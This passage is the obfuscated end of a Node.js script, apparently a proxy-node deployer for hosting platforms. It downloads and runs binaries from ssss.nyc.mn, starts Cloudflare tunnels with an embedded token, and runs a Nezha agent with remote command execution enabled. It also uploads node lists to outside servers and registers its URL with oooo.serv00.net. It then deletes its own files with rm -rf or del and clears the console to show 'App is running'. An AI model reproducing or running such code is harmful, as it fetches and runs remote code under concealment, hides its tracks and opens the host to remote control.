_0x4dd3c5&&_0x4dd3c5[_0x51f378(0x17f)]===0xc8?(console[_0x51f378(0x136)](_0x51f378(_0x135f02._0x5dcaf3)),_0x4dd3c5):null;}catch(_0x209dbd){return null;}}else return;}}function cleanFiles(){const _0x2f3f1d={_0x436e8b:0x144},_0x252ad1={_0x26653f:0xd8,_0xd57f39:0x136,_0x3e3e3b:0x104};setTimeout(()=>{const _0x1222bf={_0x137941:0x136,_0x4dc7f6:0x136},_0xb2e6be=_0x4dc1,_0x493efd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x493efd[_0xb2e6be(0xf9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x493efd[_0xb2e6be(0xf9)](phpPath);process[_0xb2e6be(0x185)]===_0xb2e6be(_0x2f3f1d._0x436e8b)?exec('del\x20/f\x20/q\x20'+_0x493efd[_0xb2e6be(0x17a)]('\x20')+_0xb2e6be(0x164),_0x1db7f0=>{const _0x5d7296=_0xb2e6be;console['clear'](),console[_0x5d7296(_0x1222bf._0x137941)]('App\x20is\x20running'),console[_0x5d7296(_0x1222bf._0x4dc7f6)](_0x5d7296(0x104));}):exec(_0xb2e6be(0x12c)+_0x493efd[_0xb2e6be(0x17a)]('\x20')+_0xb2e6be(0x10c),_0x291f52=>{const _0x330918=_0xb2e6be;console[_0x330918(_0x252ad1._0x26653f)](),console[_0x330918(_0x252ad1._0xd57f39)](_0x330918(0x111)),console[_0x330918(_0x252ad1._0xd57f39)](_0x330918(_0x252ad1._0x3e3e3b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x354a13={_0xf9c4e7:0x15d,_0x1b04cb:0x192},_0x5e9617=_0x48d5bc;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x5e9617(0x15a));return;}try{const _0x414c57=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x5e9617(_0x354a13._0xf9c4e7)),_0x414c57;}catch(_0xe9a976){return console[_0x5e9617(0x183)](_0x5e9617(0xea)+_0xe9a976[_0x5e9617(_0x354a13._0x1b04cb)]),null;}}function _0x4d6e(){const _0x74e2ae=['xtls-rprx-vision','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','rm\x20-rf\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','mkdirSync','catch','\x20successfully','UPLOAD_URL','1221880gKGlyu','forEach','send','.exe\x20>\x20nul\x202>&1','log','unshift','config.yaml','includes','success','path','ArgoDomain:','nohup\x20','length','northflank-us.tokit.dpdns.org','close','/tunnel.yml\x20run','https://amd64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','win32','fileName','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0a\x20\x20tunnel:\x20','127.0.0.1','ARGO_DOMAIN:','npm\x20running\x20error:\x20','boot.log','\x22\x20>\x20/dev/null\x202>&1','/trojan-argo','\x0a\x0atrojan://','axios','list.txt','Unhandled\x20error\x20in\x20startserver:','Download\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','3KKYjzr','--tls','Nodes\x20uploaded\x20successfully','all','Error\x20in\x20startserver:','/api/add-subscriptions','Skipping\x20adding\x20automatic\x20access\x20task','statSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','automatic\x20access\x20task\x20added\x20successfully','test','get','fileUrl','Empowerment\x20success\x20for\x20','\x20>/dev/null\x202>&1\x20&','&path=%2Fvless-argo%3Fed%3D2560#','\x20>\x20nul\x202>&1','vless','sub.txt','tls','web\x20running\x20error:\x20','tunnel.json','env','http','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2053','amd','2096','/api/add-nodes','1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4','blackhole','listen','3d95d845-9c98-4440-bd78-3632c35f5396','374168DStsEy','8443','/vmess-argo?ed=2560','unlinkSync','join','floor','https://arm64.ssss.nyc.mn/agent','1688598PIRgVE','http\x20server\x20is\x20running\x20on\x20port:','status','./tmp','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','post','error','countryCode','platform','from','/config.json\x20>/dev/null\x202>&1\x20&','createWriteStream','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','existsSync','NEZHA_KEY','443','true','org','\x20is\x20running','AUTO_ACCESS','?security=tls&sni=','message','northflank-us','\x0aclient_secret:\x20','none','/api/delete-nodes','direct','TunnelSecret','pipe','stringify','split','ARGO_DOMAIN','has','https://arm64.ssss.nyc.mn/web','clear','245578JgBEOc','https://arm64.ssss.nyc.mn/bot','sub','filter','/vless-argo','Subscription\x20uploaded\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','application/json','set','https://amd64.ssss.nyc.mn/web','/vmess-argo','response','/dev/null','aarch64','readFileSync','https://amd64.ssss.nyc.mn/bot','utf-8','Add\x20automatic\x20access\x20task\x20faild:\x20','base64','145230BeowGo','then','firefox','\x20is\x20created','?encryption=none&security=tls&sni=','arch','\x20-c\x20','abcdefghijklmnopqrstuvwxyz','2087','CFPORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_PORT','Empowerment\x20failed\x20for\x20','push','PROJECT_URL','\x0a\x0avmess://','1294440wOoDZf','data','\x0avless://','https://amd64.ssss.nyc.mn/agent','readdirSync','quic','NEZHA_SERVER','random','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','248fmnFWm','FILE_PATH','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https+local://8.8.8.8/dns-query','eyJhIjoiZDhlZDg1MmM0Y2I5YTk3Njk2Y2Q4MTJlNDJmZDcyM2QiLCJ0IjoiNWM4ZGIwNzMtMDQwZi00Mzg4LTgyNTEtYTNmMDgyMjk5ZGQ1IiwicyI6Ik5tWTRPVFJoTUdRdE16SmxNUzAwTTJObExUZ3pOVGd0WlRrNU9HVTFZalkxTXpNdyJ9','\x20>/dev/null\x202>&1','config.json','exec','\x20failed:\x20','Error\x20executing\x20command:\x20','App\x20is\x20running','block','child_process','http://ip-api.com/json/','&path=%2Ftrojan-argo%3Fed%3D2560#','cdns.doon.eu.org','Unknown','arm','writeFileSync','finish','Content-Type','ARGO_PORT','Error\x20reading\x20boot.log:','freedom','trojan','match','toString','tunnel.yml','country_code','15253iWaiCR','charAt','SERVER_PORT','taskkill\x20/f\x20/im\x20','&fp=firefox&type=ws&host=','util'];_0x4d6e=function(){return _0x74e2ae;};return _0x4d6e();}async function startserver(){const _0x2b6608=_0x48d5bc;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x44f306){console['error'](_0x2b6608(0x158),_0x44f306);}}startserver()[_0x48d5bc(0x12f)](_0x5646e6=>{const _0x24e61c={_0xe80cc0:0x183},_0x364d62=_0x48d5bc;console[_0x364d62(_0x24e61c._0xe80cc0)](_0x364d62(0x151),_0x5646e6);}),app[_0x48d5bc(0x174)](PORT,()=>console[_0x48d5bc(0x136)](_0x48d5bc(0x17e)+PORT+'!'));
